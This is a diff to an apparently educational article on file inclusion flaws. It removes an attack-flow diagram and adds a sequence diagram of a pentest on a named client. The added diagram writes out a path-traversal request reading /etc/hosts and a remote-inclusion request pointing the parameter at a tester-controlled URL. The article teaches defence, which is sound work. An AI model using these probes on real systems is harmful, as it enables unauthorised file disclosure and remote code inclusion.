@@ -30,41 +30,6 @@ one of a small, intended set of files, without actually restricting it to that s
 The parameter looks like ordinary configuration data to whoever built the feature, not like a
 security-sensitive decision about which file on disk, or on the internet, gets executed next.
 
-<figure class="diagram">
-<svg viewBox="0 0 740 130" role="img" aria-labelledby="diagram-title-file-inclusion" style="width:100%;height:auto;">
-<title id="diagram-title-file-inclusion">A user-controlled file parameter is manipulated to include an unintended local file or a remote, attacker-hosted file instead</title>
-<defs>
-<marker id="arrow-file-inclusion" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
-<path d="M0,0 L10,5 L0,10 z" fill="var(--ink-faint)"/>
-</marker>
-</defs>
-<circle cx="22" cy="20" r="11" fill="var(--accent)"/>
-<text x="22" y="24" text-anchor="middle" font-size="11" font-weight="700" fill="#fff">1</text>
-<rect x="10" y="40" width="150" height="64" rx="10" fill="var(--surface)" stroke="var(--line)" stroke-width="1.5"/>
-<text x="85" y="66" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--ink)">Attacker modifies</text>
-<text x="85" y="84" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--ink)">file parameter</text>
-<line x1="160" y1="72" x2="200" y2="72" stroke="var(--ink-faint)" stroke-width="1.5" marker-end="url(#arrow-file-inclusion)"/>
-<circle cx="212" cy="20" r="11" fill="var(--accent)"/>
-<text x="212" y="24" text-anchor="middle" font-size="11" font-weight="700" fill="#fff">2</text>
-<rect x="200" y="40" width="150" height="64" rx="10" fill="var(--surface)" stroke="var(--line)" stroke-width="1.5"/>
-<text x="275" y="66" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--ink)">App includes</text>
-<text x="275" y="84" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--ink)">without checking</text>
-<line x1="350" y1="72" x2="390" y2="72" stroke="var(--ink-faint)" stroke-width="1.5" marker-end="url(#arrow-file-inclusion)"/>
-<circle cx="402" cy="20" r="11" fill="var(--accent)"/>
-<text x="402" y="24" text-anchor="middle" font-size="11" font-weight="700" fill="#fff">3</text>
-<rect x="390" y="40" width="150" height="64" rx="10" fill="var(--surface)" stroke="var(--line)" stroke-width="1.5"/>
-<text x="465" y="66" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--ink)">Local file or</text>
-<text x="465" y="84" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--ink)">remote URL loaded</text>
-<line x1="540" y1="72" x2="580" y2="72" stroke="var(--ink-faint)" stroke-width="1.5" marker-end="url(#arrow-file-inclusion)"/>
-<circle cx="592" cy="20" r="11" fill="var(--accent)"/>
-<text x="592" y="24" text-anchor="middle" font-size="11" font-weight="700" fill="#fff">4</text>
-<rect x="580" y="40" width="150" height="64" rx="10" fill="var(--surface)" stroke="var(--line)" stroke-width="1.5"/>
-<text x="655" y="66" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--ink)">Content runs</text>
-<text x="655" y="84" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--ink)">as server code</text>
-</svg>
-<figcaption>RFI's included content is entirely attacker-controlled from the first request; LFI depends on what's already reachable on the server.</figcaption>
-</figure>
-
 ## Where It Actually Shows Up
 
 - A `page` or `template` query parameter that controls which file a script includes to render a
@@ -133,6 +98,29 @@ access logs confirm an inbound request from Halloway Media's application, provin
 parameter also accepts and fetches a remote URL, not only local paths. Testing stops at that
 confirmation; no attempt is made to host or execute an actual payload through the confirmed remote
 fetch, since proving the mechanism itself is sufficient evidence of the vulnerability's ceiling.
+
+```mermaid
+sequenceDiagram
+    participant Tester as Security Tester
+    participant App as Halloway Media Platform
+    participant LocalFS as Local Server Filesystem
+    participant TesterHost as Tester-Controlled Server
+
+    Note over Tester,App: Phase 1: Local File Inclusion (LFI) Probe
+    Tester->>App: GET /display?template=../../../../etc/hosts
+    App->>LocalFS: include("../../../../etc/hosts")
+    LocalFS-->>App: Return local file contents
+    App-->>Tester: 200 OK (Local file rendered in page body)
+    Note over Tester,App: LFI confirmed: parameter controls file inclusion without allowlist
+
+    Note over Tester,TesterHost: Phase 2: Remote File Inclusion (RFI) Probe
+    Tester->>App: GET /display?template=http://tester.test/probe.txt
+    App->>TesterHost: Outbound HTTP GET /probe.txt
+    TesterHost-->>Tester: Access log records inbound request from target server IP
+    TesterHost-->>App: 200 OK (Benign diagnostic marker)
+    App-->>Tester: Rendered diagnostic marker in response
+    Note over Tester,App: RFI mechanism proven via out-of-band request - testing halts ethically before code execution
+```
 
 ## Severity Calibration
 
